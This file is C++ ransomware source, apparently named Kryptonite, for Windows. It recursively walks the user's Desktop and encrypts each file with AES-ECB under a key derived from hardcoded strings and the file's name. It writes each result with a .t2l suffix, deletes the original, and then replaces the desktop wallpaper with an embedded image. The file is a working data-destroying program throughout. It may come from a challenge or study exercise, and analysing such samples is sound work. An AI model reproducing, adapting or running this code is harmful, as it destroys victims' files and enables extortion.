// Kryptonite.cpp : Defines the entry point for the console application.
//

#include <Windows.h>
#include "stdafx.h"
#include <ShlObj.h>
#include <strsafe.h>
#include <bcrypt.h>
#include "Nrop.h"
#include <winternl.h>
#include <ntstatus.h>

#define ENCRYPTED_SUFFIX ".t2l"
#define LINK_SUFFIX ".lnk"
#define BLOCK_LEN 256
#define MAX_FILE_SIZE_TO_ENCRYPT (100 * 1000 * 1000) // 100 MB
#define VERBOSE 1


const BYTE * cToken = (BYTE *) "AAAAAAAAAAAAAAAAAAAA";
const CHAR * bestNbaPlayer = "Paul George";
const CHAR * bestNbaPlayer2 = "Kyrie Irving";
const CHAR * bestNbaPlayer3 = "Ramad Cyber";
const CHAR * kDot = "AllHailKingKendrick!";
const size_t chunk_size = BLOCK_LEN;


int ChangeWallpaper() {
	CHAR tempPath[MAX_PATH];
	GetTempPathA(MAX_PATH, tempPath);
	StringCbCatA(tempPath, MAX_PATH, "nrop.png");

	HANDLE hFile = CreateFileA(tempPath, FILE_GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, cvar, sizeof(cvar), NULL, NULL);
	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE);
	return 0;
}
int EncryptFile(PUCHAR key, PCHAR wFilePath)
{
	NTSTATUS			Status;
	BCRYPT_KEY_HANDLE   KeyHandle = NULL;
	BCRYPT_ALG_HANDLE	AlgHandle = NULL;
	DWORD   ResultLength = 0;
	PBYTE   TempInitVector = 0;
	DWORD   TempInitVectorLength = 0;
	PBYTE   CipherText = NULL;
	DWORD   CipherTextLength = 0;
	PBYTE	ClearText = NULL;
	DWORD	ClearTextLength = 0;
	PBYTE KeyBytes = (PBYTE)key;

	CHAR * cOutputFilePath = new CHAR[MAX_PATH];
	HANDLE InputFileHandle;
	HANDLE OutputFileHandle;

	InputFileHandle = CreateFileA(wFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (InputFileHandle == INVALID_HANDLE_VALUE) 
	{
		printf("Invalid Input File Handle Error\n");
		return 1;
	}

	StringCchCopyA(cOutputFilePath, MAX_PATH, wFilePath);
	StringCchCatA(cOutputFilePath, MAX_PATH, ENCRYPTED_SUFFIX);

	OutputFileHandle = CreateFileA(cOutputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (OutputFileHandle == INVALID_HANDLE_VALUE)
	{
		printf("Invalid Output File Handle Error\n");
		return 1;
	}

	// get size of clear text and allocate space on the heap
	ClearTextLength = GetFileSize(InputFileHandle, NULL);
	ClearText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ClearTextLength);
	ReadFile(InputFileHandle, ClearText, ClearTextLength, 0, 0);


	Status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_AES_ALGORITHM, 0, 0);

	if (!NT_SUCCESS(Status))
	{
		return 1;
	}


	Status = BCryptGenerateSymmetricKey(
		AlgHandle,
		&KeyHandle,
		NULL,
		0,
		(PBYTE)key,
		40,
		0
	);


	if (!NT_SUCCESS(Status))
	{
		return 1;
	}



	Status = BCryptSetProperty(
		KeyHandle,							// Handle to a CNG object          
		BCRYPT_CHAINING_MODE,				// Property name(null terminated unicode string)
		(BYTE*)BCRYPT_CHAIN_MODE_ECB,       // Address of the buffer that contains the new property value 
		sizeof(BCRYPT_CHAIN_MODE_ECB),      // Size of the buffer in bytes
		0);									// Flags
	
	if (!NT_SUCCESS(Status))
	{
		return 1;
	}


	Status = BCryptEncrypt(
		KeyHandle,                  // Handle to a key which is used to encrypt 
		ClearText,                  // Address of the buffer that contains the plaintext
		ClearTextLength,				// Size of the buffer in bytes
		NULL,                       // A pointer to padding info, used with asymmetric and authenticated encryption; else set to NULL
		NULL,						// Address of the buffer that contains the IV. 
		NULL,						// Size of the IV buffer in bytes
		NULL,                       // Address of the buffer the recieves the ciphertext
		0,                          // Size of the buffer in bytes
		&CipherTextLength,          // Variable that recieves number of bytes copied to ciphertext buffer 
		BCRYPT_BLOCK_PADDING);      // Flags; Block padding allows to pad data to the next block size

	if (!NT_SUCCESS(Status))
	{
		return 1;
	}

	CipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, CipherTextLength);

	Status = BCryptEncrypt(
		KeyHandle,                  // Handle to a key which is used to encrypt 
		ClearText,                  // Address of the buffer that contains the plaintext
		ClearTextLength,            // Size of the buffer in bytes
		NULL,                       // A pointer to padding info, used with asymmetric and authenticated encryption; else set to NULL
		NULL,             // Address of the buffer that contains the IV. 
		NULL,       // Size of the IV buffer in bytes
		CipherText,                 // Address of the buffer the recieves the ciphertext
		CipherTextLength,           // Size of the buffer in bytes
		&ResultLength,              // Variable that recieves number of bytes copied to ciphertext buffer 
		BCRYPT_BLOCK_PADDING);      // Flags; Block padding allows to pad data to the next block size

	if (!NT_SUCCESS(Status))
	{
		return 1;
	}

	WriteFile(OutputFileHandle, CipherText, CipherTextLength, 0, 0);

	CloseHandle(InputFileHandle);
	CloseHandle(OutputFileHandle);	

	return 0;
}

int EnumerateFiles(CHAR * wFolderPath)
{
	WIN32_FIND_DATAA ffd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	CHAR * cFolderPathWithSuffix = new CHAR[MAX_PATH];
	size_t fileNameLength;
	CHAR * cFilePath = new CHAR[MAX_PATH];
	CHAR * cFileSuffix = new CHAR[4];
	
	StringCchCopyA(cFolderPathWithSuffix, MAX_PATH, wFolderPath);
	StringCchCatA(cFolderPathWithSuffix, MAX_PATH, "\\*");

	hFind = FindFirstFileA(cFolderPathWithSuffix, &ffd);

	do
	{
		// exit the loop if the file name is either "." or ".." refrencing self
		if (!strcmp(ffd.cFileName, ".") || !strcmp(ffd.cFileName, ".."))
		{
			continue;
		}



		// concat the folder path to the file name
		StringCchCopyA(cFilePath, MAX_PATH, wFolderPath);
		StringCchCatA(cFilePath, MAX_PATH, "\\");
		StringCchCatA(cFilePath, MAX_PATH, ffd.cFileName);


		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{
			// is directory
			EnumerateFiles(cFilePath);
		}
		else 
		{
			// is file
			StringCchLengthA(ffd.cFileName, MAX_PATH, &fileNameLength);
			
			// check if the file name is longer then 4 chars
			if (fileNameLength > 4) 
			{
				if (!strcmp(&ffd.cFileName[fileNameLength - 4], ENCRYPTED_SUFFIX))
				{
					// check if its already encrypted
					continue;
				}

				if (!strcmp(&ffd.cFileName[fileNameLength - 4], LINK_SUFFIX))
				{
					// check if its a link
					continue;
				}
			}

			// check if the file is too big in size
			if (ffd.nFileSizeLow > MAX_FILE_SIZE_TO_ENCRYPT)
			{
				continue;
			}

			// generate key
			char * fileName = ffd.cFileName;
			int fileNameSize = strlen(fileName);
			int kDotLength = strlen(kDot);
			unsigned char key[21] = { 0 };
			int keyLength = sizeof(key);
			memcpy_s(key, keyLength, cToken, 20);
			//StringCchCopyA(key, sizeof(key), cToken);

			//xor with kinga kunta	
			for (int i = 0; i < kDotLength; i++)
			{
				key[i] = key[i] ^ kDot[i];
			}

			// lolz and gigglez
			key[0] = key[0] + 11; // Kyrie <3
			key[keyLength - 2] = key[keyLength - 2] - 23; // Lebron <3

														  //xor with file name
			int lowerOfTwo = min(sizeof(key), fileNameSize);
			for (int i = 0; i < lowerOfTwo; i++)
			{
				key[i] = key[i] ^ fileName[i];
			}

			//encrypt file
			if (EncryptFile(key, cFilePath))
			{
				printf("Failed to encrypt %s\n", cFilePath);
				continue;			
			}

			//delete og file
			if (!DeleteFileA(cFilePath)) {
				printf("Failed to delete %s\n", cFilePath);
			}
		}
	} while (FindNextFileA(hFind, &ffd) != 0);

	FindClose(hFind);

	return 0;
}




int main()
{
	CHAR cDesktopPath[MAX_PATH + 1];
	SHGetSpecialFolderPathA(HWND_DESKTOP, cDesktopPath, CSIDL_DESKTOP, FALSE);
	//StringCchCatA(cDesktopPath, MAX_PATH, "\\test");
	EnumerateFiles(cDesktopPath);

	ChangeWallpaper();
    return 0;
}





